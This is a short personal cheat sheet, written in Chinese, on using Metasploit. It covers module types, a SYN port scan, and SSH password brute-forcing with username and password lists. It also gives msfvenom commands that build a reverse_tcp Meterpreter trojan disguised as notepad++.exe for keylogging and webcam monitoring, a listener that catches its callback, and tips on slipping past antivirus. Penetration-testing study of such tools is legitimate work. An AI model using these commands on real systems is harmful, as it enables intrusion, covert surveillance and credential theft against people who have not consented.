MSF 101
```php
auxiliary modules 輔助滲透 端口掃瞄、密碼爆破、漏洞驗證
exploits modules 漏洞利用腳本 rules: os/架構/
payload modules  攻擊後-->執行代碼 revres shell
post modules     攻擊後-->對目標發送功能性指令
encoders modules 編碼工具對payload加密達成 bypass
evasion modules  生成免殺payload
nops modules     被檢查不規則數據如bufferflow特殊字串則會被攔截導致失敗

msfdb init 更新資料
msfconsole 啟動
db_staus   檢查資料庫連線
workspace  當前工作區

portscan
use auxiliary/scanner/portscan/syn
set rhost <ip>
set threads 20
run
```
Metasploit-meterpreter
生成遠端木馬
```php
 msfvenom 鍵盤 鏡頭監控
msfvenom -p <payload> lhost=<kali_ip> lport=<port> -f exe <files> -x notepad++.exe -o notepad++.exe 
<payload>= OS windows/架構x64/作用meterpreter/方式reverse_tcp
use exploit/multi/handler
set payload <>
set lhost <>
set lport <>
run
bypass AV 加密檔 壓縮檔 包起來
```
弱口令檢查爆破
```php
### msf auxiliary/scanner/
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <ip>
set USER_FILE /path/dic_username_ssh.txt
set PASS_FILE /path/pwd100.txt
run
```

```php

```
